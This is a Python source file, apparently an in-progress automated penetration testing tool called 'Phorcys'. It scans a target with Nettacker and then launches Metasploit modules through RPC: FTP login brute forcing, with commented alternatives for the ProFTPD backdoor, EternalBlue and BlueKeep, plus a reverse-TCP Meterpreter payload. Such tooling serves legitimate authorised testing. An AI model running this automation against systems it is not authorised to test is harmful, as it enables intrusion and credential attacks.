# #Dealing with arguments
# # fully reset docker stop $(docker ps -qa) && docker system prune -af --volumes

# import argparse
# import pprint
# import configparser
# from modules.settings import Settings
# import time
# from modules.nettacker import NettackerInterface

# # from pymetasploit3.msfrpc import MsfRpcClient
# # from pymetasploit3.msfconsole import MsfRpcConsole

# #['auxiliary', 'encodeformats', 'encoders', 
# # 'evasion', 'execute', 'exploits', 'nops', 'payloads', 'platforms', 'post', 'rpc', 'use']    
# def dirty_search(client, keyword):
#     return [m for m in client.modules.exploits if keyword in m]

# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
#     for x in m: ## for every result in the search?
#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
#         exploit['RHOSTS'] = targetIP # Need to obtain targetIP addresss somehow
#         exploit['RPORT'] = port # Need to specify port?


# def arguments():
#     parser = argparse.ArgumentParser(description = 'Phorcys Automated Penetration Testing Tool')
#     parser.add_argument('target', type=str, help="IP Address (IPv4, IPv6, Domain, CIDR)")

#     args = parser.parse_args()
    
#     if args.target:
#         target = args.target
#         return target
    
#     parser.print_help()

# if __name__ == '__main__':

#     # setup parser 
#     config_parser = configparser.ConfigParser()
#     config_parser.read('config.ini')

#     ip = arguments()

#     # setup settings
#     parameters = {
#         'nettacker_ip': config_parser.get('Nettacker', 'ip'), 
#         'nettacker_port': int(config_parser.get('Nettacker', 'port')),
#         'nettacker_key': config_parser.get('Nettacker', 'key'),
#         'metasploit_ip': config_parser.get('Metasploit', 'ip'),
#         'metasploit_port': int(config_parser.get('Metasploit', 'port')),
#         'metasploit_password': config_parser.get('Metasploit', 'password'),
#         'target': ip 
#     }
#     # create config
#     config = Settings(**parameters)

#     data = config.get_dict()

#     pp = pprint.PrettyPrinter(indent=4)
#     # example
#     scanner = NettackerInterface(**data, ping_flag=True)
#     # results = scanner.new_scan()
#     pp.pprint(scanner.get_port_scan_data())


#     #sleep(10)

#     # pp.pprint(scanner.get_scan_data())

#     # client = MsfRpcClient(data.get('metasploit_password'), port=55552, server=data.get('metasploit_ip'))

#     # console_id = client.consoles.console().cid
#     # console = client.consoles.console(console_id)
#     # console.write("nmap 127.0.0.1")

#     # while console.is_busy():
#     #     time.sleep(5)
#     # print(console.read())

#     # method_list = [func for func in dir(console) if callable(getattr(console, func))]
#     # print(method_list)

#Dealing with arguments
# fully reset docker stop $(docker ps -qa) && docker system prune -af --volumes

import argparse
import pprint
import configparser
from modules.settings import Settings
from modules.metasploit import MetasploitInterface

import time
import logging
from modules.nettacker import NettackerInterface
from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfconsole import MsfRpcConsole

def arguments():
    banner = """
   ___  __                   
  / _ \/ /  ___  __________ _____
 / ___/ _ \/ _ \/ __/ __/ // (_-<
/_/  /_//_/\___/_/  \__/\_, /___/
                       /___/
    """
    tagrget, level = '', ''
    parser = argparse.ArgumentParser(description = 'Phorcys Automated Penetration Testing Tool')
    parser.add_argument('target', type=str, help="IP Address (IPv4, IPv6, Domain, CIDR)")
    parser.add_argument("--l", "--log", type=str, dest="logLevel", help="Set the logging level - INFO, DEBUG or ALL")
    print(banner)
    args = parser.parse_args()
    
    if args.target and args.logLevel:
        logging.basicConfig(level=args.logLevel)
        target = args.target
        return target

    else:
        target = args.target
        # level = 'NOTSET'
    # print(level)
    return target

    parser.print_help()
if __name__ == '__main__':
    # setup parser 
    config_parser = configparser.ConfigParser()
    config_parser.read('config.ini')
    ip = arguments()
    # setup settings
    parameters = {
        'nettacker_ip': config_parser.get('Nettacker', 'ip'), 
        'nettacker_port': int(config_parser.get('Nettacker', 'port')),
        'nettacker_key': config_parser.get('Nettacker', 'key'),
        'metasploit_ip': config_parser.get('Metasploit', 'ip'),
        'metasploit_port': int(config_parser.get('Metasploit', 'port')),
        'metasploit_password': config_parser.get('Metasploit', 'password'),
        'target': ip
        # 'verbosity': verbose_level
    }
    # create config
    config = Settings(**parameters)
    data = config.get_dict()
    """
    pp = pprint.PrettyPrinter(indent=4)
    # example
    scanner = NettackerInterface(**data)
    # results = scanner.new_scan()
    pp.pprint(scanner.get_port_scan_data())
    #sleep(10)
    # pp.pprint(scanner.get_scan_data())
    """
    # client = MsfRpcClient(data.get('metasploit_password'), port=data.get('metasploit_port'), server=data.get('metasploit_ip'))
    # print([m for m in dir(client) if not m.startswith('_')])

    # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'auxiliary/scanner/ftp/anonymous')
    # success, user_level, exploit = metasploit.scanFTP()

    # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'exploit/unix/ftp/proftpd_133c_backdoor')
    # success, user_level, exploit = metasploit.exploitFTP()
    

    metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'))


    # success, user_level, exploit = metasploit.run(data.get('target'), 'exploit/unix/ftp/proftpd_133c_backdoor', 21)
    # success, user_level, exploit = metasploit.run(data.get('target'), 'exploit/windows/smb/ms17_010_eternalblue', 445)
    # success, user_level, exploit = metasploit.run(data.get('target'), 'auxiliary/scanner/ftp/anonymous', 21)
    # success, user_level, exploit = metasploit.run(data.get('target'), 'auxiliary/scanner/rdp/rdp_scanner', 3389)
    success, user_level, exploit = metasploit.run(data.get('target'), 'auxiliary/scanner/ftp/ftp_login', 21)
    # success, user_level, exploit = metasploit.run(data.get('target'), 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep', 3389)


    # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'auxiliary/scanner/rdp/rdp_scanner')
    # success, user_level, exploit = metasploit.rdpScanner()

    # metasploit = MetasploitInterface(data.get('metasploit_ip'), data.get('metasploit_port'), data.get('metasploit_password'), data.get('target'), 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce')
    # success, user_level, exploit = metasploit.blueKeep()

    
    # print("Main Results: ")
    # # print("Target: " + ip)
    # print("Success: ", success)
    # print("User level: " + user_level)
    # print("Exploit: " + exploit)


